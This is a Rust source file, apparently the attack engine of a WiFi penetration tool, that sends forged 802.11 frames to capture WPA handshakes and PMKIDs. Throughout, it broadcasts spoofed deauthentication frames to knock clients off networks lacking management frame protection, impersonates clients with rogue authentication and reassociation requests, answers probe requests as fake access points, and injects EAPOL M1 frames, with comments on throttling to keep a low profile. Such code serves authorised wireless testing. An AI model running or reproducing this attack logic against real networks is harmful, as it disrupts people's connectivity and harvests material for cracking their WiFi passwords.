// Attack! //

use std::os::fd::AsRawFd;

use libwifi::frame::{
    components::{MacAddress, RsnAkmSuite, RsnCipherSuite},
    AssociationRequest, Authentication, Beacon, DeauthenticationReason, ProbeRequest,
    ProbeResponse,
};

use crate::{
    devices::{AccessPoint, Station, WiFiDeviceType},
    status::{MessageType, StatusMessage},
    tx::{
        build_association_request, build_association_request_org, build_association_response,
        build_authentication_frame_noack, build_authentication_response,
        build_deauthentication_fm_ap, build_deauthentication_fm_client, build_eapol_m1,
        build_probe_request_undirected, build_probe_response, build_reassociation_request,
    },
    write_packet, WPOxideRuntime,
};

/// Attack! ///
/// The attack engine is currently partially stateless.
///  - No tracking of our association/authentication state.
///  - We track what we have collected from the AP in the form of PMKID, EAPoL, ESSID, Beacons, Interactions, and the specific AP configuration details.
///  - Those are what we use to decide how we interact. This means we are often sending the "wrong" frame at the "wrong" time.
///  - I need to identify which attack types would benefit from better state tracking
///     - An example would be sending Auth / Assoc / Reassoc in the correct order (Which we are doing- just not checking for Ack's from the AP to know we are ready for the next "stage".)

/// Beacon Attacks:
///  - We will only interact if we don't yet have a "complete" on this target (which really is a valid 4whs)
///  - Beacons are the only constant. They are sent consistently every beacon_interval, usually 100ms... so we have to be careful here. We are likely to flood pretty quick.
///  - We space our attacks out so we aren't hitting it on every beacon, just every 4. The same attack will be fired off only once every 16 beacons.
///  - If we don't have the SSID of this AP, we fire off a undirect proberequest every 8 beacons until we get one. Because this is undirected we usually end up with all the SSID's pretty quick.
///  Process:
///     1) Send Authentication (If Have SSID, No M1 collected, and AKM is PSK)
///     2) Send Deauths if MFP Reqired is False and using PSK
///     3) Send Rasssociation Request (If AKM is PSK)
///     4) Send Reassociation Last (If AKM is PSK)
pub fn attack_beacon(
    oxide: &mut WPOxideRuntime,
    frame: &Beacon,
    ap_mac: &MacAddress,
) -> Result<(), String> {
    let mut interacted = false;
    if !oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
            dev
        } else {
            return Ok(());
        };

        if ap_data.interactions < 32 {
            let beacon_count = ap_data.beacon_count;

            if (beacon_count % 8) == 0 && ap_data.ssid.is_none() {
                // Attempt to get the SSID.
                let frx =
                    build_probe_request_undirected(&oxide.rogue_client, oxide.counters.sequence2());
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
            }
            if (beacon_count % 16) == 0 {
                // beacon_count mod 16 = 0
                // Auth Request - initiate our comms with AP.
                // Only continue if we don't already have an M1.
                if !oxide.handshake_storage.has_m1_for_ap(ap_mac) {
                    let frx = build_authentication_frame_noack(
                        ap_mac,
                        &oxide.rogue_client,
                        oxide.counters.sequence2(),
                    );
                    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                    interacted = true;
                }
            } else if (beacon_count % 16) == 4 {
                // beacon_count mod 16 = 12
                // Association request

                if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
                    // RSN_AKM_PSK
                    let frx = build_association_request_org(
                        ap_mac,
                        &ap_data
                            .client_list
                            .get_random()
                            .unwrap_or(return Err("No client to impersonate.".to_owned()))
                            .mac_address,
                        ap_mac,
                        oxide.counters.sequence2(),
                        ap_data.ssid.clone(),
                    );
                    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                    interacted = true;
                }
            } else if (beacon_count % 16) == 8 {
                // beacon_count mod 16 = 8
                // Send reassociation
                if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
                    // RSN_AKM_PSK

                    if let Some(rsn) = &frame.station_info.rsn_information {
                        // Send Reassociation Request if we have any RSN info.

                        let ssid = frame.station_info.ssid.clone();
                        let gcs = rsn.group_cipher_suite.clone();
                        let pcs = rsn.pairwise_cipher_suites.clone();

                        if let Some(client) = ap_data.client_list.get_random() {
                            let frx = build_reassociation_request(
                                ap_mac,
                                &client.mac_address,
                                ssid,
                                oxide.counters.sequence3(),
                                gcs,
                                pcs,
                            );
                            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                            interacted = true;
                        }
                    }
                }
            } else if (beacon_count % 16) == 12 {
                // beacon_count mod 16 = 4

                if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp)
                    && ap_data.information.akm_mask()
                {
                    // Extract data needed for processing
                    let random_client = ap_data
                        .client_list
                        .get_random()
                        .map(|client| client.mac_address.clone());

                    // Process based on the extracted data
                    if let Some(mac_address) = random_client {
                        // Deauth From AP
                        let frx = build_deauthentication_fm_ap(
                            ap_mac,
                            &mac_address,
                            oxide.counters.sequence1(),
                            DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                        );
                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                        // Deauth From Client
                        let frx = build_deauthentication_fm_client(
                            ap_mac,
                            &mac_address,
                            oxide.counters.sequence1(),
                            DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
                        );
                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                        interacted = true;
                    } else {
                        // There is no client
                        let frx = build_deauthentication_fm_ap(
                            ap_mac,
                            &MacAddress([255, 255, 255, 255, 255, 255]),
                            oxide.counters.sequence1(),
                            DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                        );
                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                        interacted = true;
                    }
                }
            }

            if interacted {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!("Attacked Beacon: {}", ap_mac),
                ));
            }
        }
    }
    // Increment interactions
    if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        // This is here because I couldn't decide if I wanted interacations to match beacons or not...
        if interacted {
            ap.interactions += 1
        }
        // We get less interactions with this one, only two or so of each before we run out, then we have to wait for the interactions timer to reset. Good for keeping profile a bit lower.
        //ap.interactions += 1;
        ap.beacon_count += 1;
    }
    Ok(())
}

/// Probe Response Attacks:
///  - Probe response frames are a pretty good source of information. They are a direct response to a probe - possibly directed.
///  - We are going to use some of the same attacks as a Beacon frame attack.
///  - We aren't however going to throttle our attacks, because we want to attack every probe response.
///  Process:
///     1) Deauth (If not MFP Required & using PSK)
///     2) Authentication Request (If AKM PSK & No SSID)
///     3) Send Reassociation Request (If AKM PSK)
pub fn attack_probe_response(
    oxide: &mut WPOxideRuntime,
    frame: &ProbeResponse,
    ap_mac: &MacAddress,
) -> Result<(), String> {
    let mut interacted = false;
    if !oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
            dev
        } else {
            return Ok(());
        };

        if ap_data.interactions < 32 {
            // Send Deauth From AP (To Broadcast)
            if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask()
            {
                let frx = build_deauthentication_fm_ap(
                    ap_mac,
                    &MacAddress([255, 255, 255, 255, 255, 255]),
                    oxide.counters.sequence1(),
                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                interacted = true;
            }

            if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
                // Send Authentication Request

                if ap_data.ssid.is_none() {
                    let frx = build_authentication_frame_noack(
                        ap_mac,
                        &oxide.rogue_client,
                        oxide.counters.sequence2(),
                    );
                    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                    interacted = true;
                }

                if let Some(rsn) = &frame.station_info.rsn_information {
                    // Send Reassociation Request if we have any RSN info.

                    let ssid = frame.station_info.ssid.clone();
                    let gcs = rsn.group_cipher_suite.clone();
                    let pcs = rsn.pairwise_cipher_suites.clone();
                    if let Some(client) = ap_data.client_list.get_random() {
                        let frx = build_reassociation_request(
                            ap_mac,
                            &client.mac_address,
                            ssid,
                            1,
                            gcs,
                            pcs,
                        );
                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                        interacted = true;
                    }
                };
            }

            if interacted {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!("Attacked Probe Response: {}", ap_mac),
                ));
            }
        }
    }
    // Increment interactions
    if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        // This is here because I couldn't decide if I wanted interacations to match beacons or not...
        if interacted {
            ap.interactions += 1
        }
        // We get less interactions with this one, only two or so of each before we run out, then we have to wait for the interactions timer to reset. Good for keeping profile a bit lower.
        //ap.interactions += 1;
        ap.beacon_count += 1;
    }
    Ok(())
}

/// Probe Request Attacks:
///  - This will send a probe response to any undirected probe requests.
pub fn attack_probe_request(
    oxide: &mut WPOxideRuntime,
    client_mac: &MacAddress,
    channel: u8,
    ssid: Option<String>,
) -> Result<(), String> {
    let aprg = oxide.access_points.get_random().unwrap();
    let aprg_mac = &aprg.mac_address;
    let aprg_ssid = if let Some(ssid) = &aprg.ssid {
        ssid.clone()
    } else {
        "".to_string()
    };
    if let Some(ssid) = ssid {
        let frx = build_probe_response(
            client_mac,
            aprg_mac,
            &ssid,
            oxide.counters.sequence3(),
            channel,
        );
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
    } else {
        let frx = build_probe_response(
            client_mac,
            aprg_mac,
            &aprg_ssid,
            oxide.counters.sequence3(),
            channel,
        );
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
    }
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Attacked Probe Request: {}", client_mac),
    ));

    Ok(())
}

/// Probe Request Direct Attacks:
///  - This will send a probe response to any undirected probe requests.
pub fn attack_probe_request_direct(
    oxide: &mut WPOxideRuntime,
    client_mac: &MacAddress,
    ap_mac: &MacAddress,
    channel: u8,
    ssid: String,
) -> Result<(), String> {
    let frx = build_probe_response(
        client_mac,
        ap_mac,
        &ssid,
        oxide.counters.sequence3(),
        channel,
    );
    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!(
            "Attacked Probe Request (DIRECT): {} => {}",
            client_mac, ap_mac
        ),
    ));
    Ok(())
}

pub fn attack_authentication_from_ap(
    macap: &MacAddress,
    macclient: &MacAddress,
    oxide: &mut WPOxideRuntime,
) -> Result<(), String> {
    let ap_data = if let Some(ap) = oxide.access_points.get_device(macap) {
        ap
    } else {
        return Ok(());
    };
    if ap_data.is_auth_time_elapsed() && ap_data.information.rsn_akm_psk.is_some_and(|f| f) {
        let cs = if ap_data.information.cs_tkip.is_some_and(|f| f) {
            RsnCipherSuite::TKIP
        } else {
            RsnCipherSuite::CCMP
        };
        let gs = if ap_data.information.gs_tkip.is_some_and(|f| f) {
            RsnCipherSuite::TKIP
        } else {
            RsnCipherSuite::CCMP
        };

        let frx = build_association_request(
            macap,
            macclient,
            ap_data.ssid.clone(),
            oxide.counters.sequence2(),
            gs,
            vec![cs],
        );
        ap_data.update_auth_timer();
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Continued Authentication: {}", macap),
        ));
    }
    Ok(())
}

pub fn attack_authentication_from_client(
    macap: &MacAddress,
    macclient: &MacAddress,
    bssid: &MacAddress,
    oxide: &mut WPOxideRuntime,
) -> Result<(), String> {
    let frx = build_authentication_response(macclient, macap, bssid, oxide.counters.sequence3());
    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

    Ok(())
}

pub fn attack_association_request(
    macclient: &MacAddress,
    macap: &MacAddress,
    bssid: &MacAddress,
    frame: &AssociationRequest,
    oxide: &mut WPOxideRuntime,
) -> Result<(), String> {
    let rsnakm = if let Some(rsn) = &frame.station_info.rsn_information {
        rsn.akm_suites.contains(&RsnAkmSuite::PSK)
    } else {
        false
    };

    if rsnakm {
        let frx = build_association_response(macclient, macap, bssid, oxide.counters.seq3);
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        let frx = build_eapol_m1(macclient, macap, bssid, oxide.counters.seq3);
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
    }

    Ok(())
}

pub fn attack_reassociation_request(
    macclient: &MacAddress,
    macap: &MacAddress,
    bssid: &MacAddress,
    frame: &AssociationRequest,
    oxide: &mut WPOxideRuntime,
) -> Result<(), String> {
    let rsnakm = if let Some(rsn) = &frame.station_info.rsn_information {
        rsn.akm_suites.contains(&RsnAkmSuite::PSK)
    } else {
        false
    };

    if rsnakm {
        let frx = build_association_response(macclient, macap, bssid, oxide.counters.seq3);
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        let frx = build_eapol_m1(macclient, macap, bssid, oxide.counters.seq3);
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
    }

    Ok(())
}
